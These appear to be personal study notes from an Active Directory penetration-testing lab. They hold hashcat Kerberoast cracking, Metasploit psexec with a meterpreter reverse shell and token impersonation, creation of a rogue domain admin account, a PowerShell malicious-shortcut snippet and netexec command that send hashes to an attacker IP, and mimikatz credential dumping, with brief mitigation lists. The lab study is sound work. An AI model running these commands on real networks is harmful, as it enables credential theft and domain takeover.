

![[Pasted image 20240729110424.png]]

![[Pasted image 20240729164657.png]]

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
will crack the hash

MYpassword123#

# mitigations

strong password
least privilage 


# Token impersenation

tokens - cookies for computers

two types:
delegate - created when logging in 
impersonate - non-interactive ( like a script)

metasploit has a incognito module

```
msfconsole 

windows/smb/psexec

use the punisher as rhosts (not working, but works with DC as ip)
set smbuser 2B
set smbpass Password1
set smbdomain nier.local
set payload windows/x64/meterpreter/reverse_tcp

run

load incognito 

list_tokens -u (users) -g (groups)
make sure you're logged im

impersonate_token nier\\2B
shell
whoami

rev2self (reverts impersonate)

login as admin

impersonate_token nier\\administrator

shell
net user /add engels Password1@ /domain 

net group "domain Admins" engels /ADD /DOMAIN



```
![[Pasted image 20240730102959.png]]

# mitigations

limit user/group token creation perms
account tiering 
local admin restrictions 

# link file attacks

```
`$objShell = New-Object -ComObject WScript.shell $lnk = $objShell.CreateShortcut("C:\test.lnk") $lnk.TargetPath = "\\192.168.138.149\@test.png" $lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" $lnk.Description = "Test" $lnk.HotKey = "Ctrl+Alt+T" $lnk.Save()`
```
we can capture hash using responder 

netexec can do this automatically
```
netexec smb 10.0.2.15 -d nier.local -u 2B -p Password1 -M slinky -o NAME=test SERVER=10.0.2.5(attacker ip)
```

![[Pasted image 20240730103655.png]]

![[Pasted image 20240730103715.png]]

https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf


# GPP Attacks 
![[Pasted image 20240729195028.png]]

very old but still relevant 

metasploit has a smb_enum_gpp module for this
# mitigtations:
delete old xml files
patch the system


# mimikatz

login to 9S on the bunker 

https://github.com/gentilkiwi/mimikatz

share mimikatz to the windows machine
located in /usr/shares/windows-resources/mimikatz/x64

```
mimikatz.exe

privilege::debug

sekurlsa::logonPasswords


```

![[Pasted image 20240730111827.png]]


